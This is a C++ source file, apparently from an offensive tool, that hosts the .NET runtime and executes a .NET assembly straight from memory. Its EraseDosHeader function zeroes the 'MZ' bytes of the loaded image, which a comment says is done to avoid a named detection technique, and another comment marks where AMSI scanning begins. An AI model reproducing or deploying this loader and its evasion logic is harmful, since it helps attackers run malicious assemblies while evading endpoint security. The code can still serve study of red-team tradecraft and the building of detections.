#include <iostream>

#include <vector>
#include <Windows.h>
#include <MetaHost.h>
#include <MSCorEE.h>

#include "Native.h"
#include "Hooks.h"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "oleaut32.lib")

#import "mscorlib.tlb" auto_rename

const char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
const char v2[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

const wchar_t wClrV2[] = L"v2.0.50727";
const wchar_t wClrV4[] = L"v4.0.30319";

static const IID IID_AppDomain = { 0x05F696DC, 0x2B29, 0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13} };

int GetVersionOfClr(
	_In_	char* AssemblyContent,
	_In_	long	AssemblySize
)
{
	for (int i = 0; i < (AssemblySize - sizeof(v2)); i++)
	{
		if (
			AssemblyContent[i + 0] == v2[0] &&
			AssemblyContent[i + 1] == v2[1] &&
			AssemblyContent[i + 2] == v2[2] &&
			AssemblyContent[i + 3] == v2[3] &&
			AssemblyContent[i + 4] == v2[4] &&
			AssemblyContent[i + 5] == v2[5] &&
			AssemblyContent[i + 6] == v2[6] &&
			AssemblyContent[i + 7] == v2[7] &&
			AssemblyContent[i + 8] == v2[8] &&
			AssemblyContent[i + 9] == v2[9]
			)
		{
#ifdef _DEBUG
			printf("[!] CLR v2 !\n");
#endif
			return 2;
		}
		else if (
			AssemblyContent[i + 0] == v4[0] &&
			AssemblyContent[i + 1] == v4[1] &&
			AssemblyContent[i + 2] == v4[2] &&
			AssemblyContent[i + 3] == v4[3] &&
			AssemblyContent[i + 4] == v4[4] &&
			AssemblyContent[i + 5] == v4[5] &&
			AssemblyContent[i + 6] == v4[6] &&
			AssemblyContent[i + 7] == v4[7] &&
			AssemblyContent[i + 8] == v4[8] &&
			AssemblyContent[i + 9] == v4[9]
			)
		{
#ifdef _DEBUG
			printf("[!] CLR v4 !\n");
#endif
			return 4;
		}
		else
		{
			continue;
		}
	}
	return 0;
}

bool EraseDosHeader()
{
	SYSTEM_INFO si = { 0 };
	GetSystemInfo(&si);

	const uintptr_t minAddr = reinterpret_cast<uintptr_t>(si.lpMinimumApplicationAddress);
	const uintptr_t maxAddr = reinterpret_cast<uintptr_t>(si.lpMaximumApplicationAddress);

	MEMORY_BASIC_INFORMATION mbi{};
	uintptr_t addr = minAddr;

	while (addr < maxAddr)
	{
		SIZE_T ret = VirtualQuery(reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi));
		if (ret == 0)
		{
			addr += 0x1000;
			continue;
		}

		if (
			mbi.Protect ==	0x4 &&
			mbi.Type ==		0x40000 &&
			mbi.State ==	0x1000 &&
			reinterpret_cast<unsigned char*>(mbi.BaseAddress)[0] == 0x4d &&
			reinterpret_cast<unsigned char*>(mbi.BaseAddress)[1] == 0x5a
			)
		{
			reinterpret_cast<unsigned char*>(mbi.BaseAddress)[0] = 0;
			reinterpret_cast<unsigned char*>(mbi.BaseAddress)[1] = 0;

			return true;
		}

		addr += mbi.RegionSize;
	}
	return false;
}

bool ExecuteAssembly(
	_In_	void* AssemblyContent,
	_In_	long		AssemblySize,
	_In_	std::wstring* AssemblyArgs
)
{
	HRESULT	hRes = 0;

	int ClrVersion = GetVersionOfClr((char*)AssemblyContent, AssemblySize);

	ICLRMetaHost* pMetaHost = NULL;
	IEnumUnknown* pRuntimeEnum = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	ICorRuntimeHost* pRuntimeHost = NULL;
	IUnknown* pAppDomainThunk = NULL;

	mscorlib::_AppDomain* pAppDomain = nullptr;
	mscorlib::_Assembly* pAssembly = nullptr;
	mscorlib::_MethodInfo* pMethodInfo = nullptr;


	hRes = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (void**)&pMetaHost);
	if (FAILED(hRes))
	{
		return false;
	}

	hRes = pMetaHost->EnumerateLoadedRuntimes(NtCurrentProcess, &pRuntimeEnum);
	if (FAILED(hRes))
	{
		return false;
	}

	if (ClrVersion == 2)
	{
		hRes = pMetaHost->GetRuntime(wClrV2, IID_ICLRRuntimeInfo, (PVOID*)&pRuntimeInfo);
	}
	else
	{
		hRes = pMetaHost->GetRuntime(wClrV4, IID_ICLRRuntimeInfo, (PVOID*)&pRuntimeInfo);
	}

	if (FAILED(hRes))
	{
#ifdef _DEBUG
		printf("[!]	Can't load the CLR !! hRes : 0x%llx\n", hRes);
#endif
	}

	hRes = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (PVOID*)&pRuntimeHost);
	if (FAILED(hRes))
	{
		return false;
	}

	hRes = pRuntimeHost->Start();
	if (FAILED(hRes))
	{
		return false;
	}

	hRes = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
	if (FAILED(hRes))
	{
		return false;
	}

	SAFEARRAYBOUND rgsabound[1];
	rgsabound[0].cElements = AssemblySize;
	rgsabound[0].lLbound = 0;
	DWORD dwOldProtect = 0;

	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
	if (pSafeArray == NULL)
	{
		return FALSE;
	}

	PVOID pvData = NULL;

	hRes = SafeArrayAccessData(pSafeArray, &pvData);
	if (FAILED(hRes))
	{
		return FALSE;
	}

	RtlCopyMemory(pvData, AssemblyContent, AssemblySize);
	free(AssemblyContent);
	//VirtualFree(AssemblyContent, 0, MEM_RELEASE);


	hRes = SafeArrayUnaccessData(pSafeArray);
	if (FAILED(hRes))
	{
		return FALSE;
	}

	/*
		Now CLR is loaded and started. The assembly need to be laoded to be run
	*/

	hRes = pAppDomainThunk->QueryInterface(IID_AppDomain, (PVOID*)&pAppDomain);
	if (FAILED(hRes))
	{
		return FALSE;
	}

	/*
		Amsi will be laod after this function call
	*/
	hRes = pAppDomain->raw_Load_3((SAFEARRAY*)pSafeArray, &pAssembly);
	if (FAILED(hRes))
	{
#ifdef _DEBUG
		printf("[!] Failed to load the assembly ! Error : %llx\n", hRes);
#endif
	}

	hRes = pAssembly->get_EntryPoint(&pMethodInfo);
	if (FAILED(hRes))
	{
		return FALSE;
	}

	/*
		Dotnet app is loaded, just need to call Invoke to run it
	*/
	std::vector<std::wstring> tokens;
	tokens.push_back(AssemblyArgs->c_str());

	SAFEARRAYBOUND sabStr = { (ULONG)tokens.size(), 0 };
	SAFEARRAY* saStr = SafeArrayCreate(VT_BSTR, 1, &sabStr);
	for (LONG i = 0; i < (LONG)tokens.size(); ++i)
	{
		_bstr_t b(tokens[i].c_str());
		SafeArrayPutElement(saStr, &i, (BSTR)b);
	}

	VARIANT vStrArray;  VariantInit(&vStrArray);
	vStrArray.vt = VT_ARRAY | VT_BSTR;
	vStrArray.parray = saStr;

	SAFEARRAYBOUND sabParams = { 1, 0 };
	SAFEARRAY* saParams = SafeArrayCreate(VT_VARIANT, 1, &sabParams);
	LONG idx = 0;
	SafeArrayPutElement(saParams, &idx, &vStrArray);

	VARIANT vtEmpty;  VariantInit(&vtEmpty);
	VARIANT vtRet;    VariantInit(&vtRet);

	/*
		Remove DOS Header to avoid detection with
		https://gist.github.com/dezhub/2875fa6dc78083cedeab10abc551cb58
	*/
	if (!EraseDosHeader())
	{
#ifdef _DEBUG
		printf("[!] Didn't find RW unbacked memory region with DOS Header !\n");
#endif
		return false;
	}

	/*
	Start the assembly
	*/
	hRes = pMethodInfo->raw_Invoke_3(vtEmpty, saParams, &vtRet);
	if (FAILED(hRes))
	{
#ifdef _DEBUG
		printf("[!] ERROR during execution of assembly : %llx\n", hRes);
#endif
		return false;
	}

	return true;
}